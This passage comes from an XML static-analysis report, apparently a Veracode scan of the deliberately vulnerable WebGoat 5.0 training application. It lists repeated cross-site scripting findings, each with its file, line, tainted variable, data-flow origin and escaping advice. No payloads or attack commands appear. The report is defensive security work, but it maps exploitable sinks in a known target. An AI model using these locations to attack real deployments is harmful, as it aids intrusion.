        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable employee.getDisciplinaryActionNotes().
        The tainted data originated from earlier calls to javax.servlet.servletrequest.getparameter,
        java.sql.statement.executequery, java.sql.preparedstatement.executequery,
        and javax.servlet.servletrequest.getparametervalues. The tainted data is directed
        into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"EditProfile_jsp.java\" line=\"106\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/RoleBasedAccessControl/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.RoleBasedAccessControl.EditProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"61\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"162\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable stub.getLastName().
        The tainted data originated from an earlier call to java.sql.statement.executequery.
        The tainted data is directed into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"0\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"EditProfile_jsp.java\" line=\"113\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/CrossSiteScripting/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.CrossSiteScripting.EditProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"69\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"-1\">\n<note>The source of the tainted data in this web
        application flaw is not a web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"167\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable stub.getLastName().
        The tainted data originated from an earlier call to java.sql.statement.executequery.
        The tainted data is directed into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"0\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"EditProfile_jsp.java\" line=\"113\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/SQLInjection/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.SQLInjection.EditProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"69\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"-1\">\n<note>The source of the tainted data in this web
        application flaw is not a web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"2\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable employee.getDisciplinaryActionNotes().
        The tainted data originated from earlier calls to javax.servlet.servletrequest.getparameter,
        java.sql.statement.executequery, java.sql.preparedstatement.executequery,
        and javax.servlet.servletrequest.getparametervalues. The tainted data is directed
        into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"EditProfile_jsp.java\" line=\"119\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/SQLInjection/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.SQLInjection.EditProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"74\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"266\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable employee.getDisciplinaryActionNotes().
        The tainted data originated from earlier calls to javax.servlet.servletrequest.getparameter,
        java.sql.statement.executequery, java.sql.preparedstatement.executequery,
        and javax.servlet.servletrequest.getparametervalues. The tainted data is directed
        into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"EditProfile_jsp.java\" line=\"119\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/CrossSiteScripting/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.CrossSiteScripting.EditProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"74\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"233\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable stub.getLastName().
        The tainted data originated from an earlier call to java.sql.statement.executequery.
        The tainted data is directed into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"0\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"EditProfile_jsp.java\" line=\"121\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/RoleBasedAccessControl/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.RoleBasedAccessControl.EditProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"75\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"-1\">\n<note>The source of the tainted data in this web
        application flaw is not a web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"220\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable employee.getDisciplinaryActionDate().
        The tainted data originated from earlier calls to javax.servlet.servletrequest.getparametervalues,
        javax.servlet.servletrequest.getparameter, java.sql.statement.executequery,
        and java.sql.preparedstatement.executequery. The tainted data is directed
        into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"EditProfile_jsp.java\" line=\"123\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/SQLInjection/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.SQLInjection.EditProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"77\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"188\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable employee.getDisciplinaryActionDate().
        The tainted data originated from earlier calls to javax.servlet.servletrequest.getparametervalues,
        javax.servlet.servletrequest.getparameter, java.sql.statement.executequery,
        and java.sql.preparedstatement.executequery. The tainted data is directed
        into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"EditProfile_jsp.java\" line=\"123\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/CrossSiteScripting/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.CrossSiteScripting.EditProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"77\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"15\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable employee.getTitle().
        The tainted data originated from earlier calls to javax.servlet.servletrequest.getparametervalues,
        javax.servlet.servletrequest.getparameter, java.sql.statement.executequery,
        and java.sql.preparedstatement.executequery. The tainted data is directed
        into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"EditProfile_jsp.java\" line=\"133\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/SQLInjection/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.SQLInjection.EditProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"86\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"183\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable employee.getTitle().
        The tainted data originated from earlier calls to javax.servlet.servletrequest.getparametervalues,
        javax.servlet.servletrequest.getparameter, java.sql.statement.executequery,
        and java.sql.preparedstatement.executequery. The tainted data is directed
        into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"EditProfile_jsp.java\" line=\"133\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/CrossSiteScripting/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.CrossSiteScripting.EditProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"86\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"191\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable employee.getTitle().
        The tainted data originated from earlier calls to javax.servlet.servletrequest.getparametervalues,
        javax.servlet.servletrequest.getparameter, java.sql.statement.executequery,
        and java.sql.preparedstatement.executequery. The tainted data is directed
        into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"EditProfile_jsp.java\" line=\"133\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/RoleBasedAccessControl/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.RoleBasedAccessControl.EditProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"86\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"20\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"java.io.PrintWriter.print\" description=\"This call to java.io.PrintWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable message.
        The tainted data originated from an earlier call to javax.servlet.servletrequest.getparametervalues.
        The tainted data is directed into an output stream returned by javax.servlet.servletresponse.getoutputstream.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"HttpSplitting.java\" line=\"112\" sourcefilepath=\"org/owasp/webgoat/lessons/\"
        scope=\"org.owasp.webgoat.lessons.HttpSplitting\" functionprototype=\"apache.ecs.Element
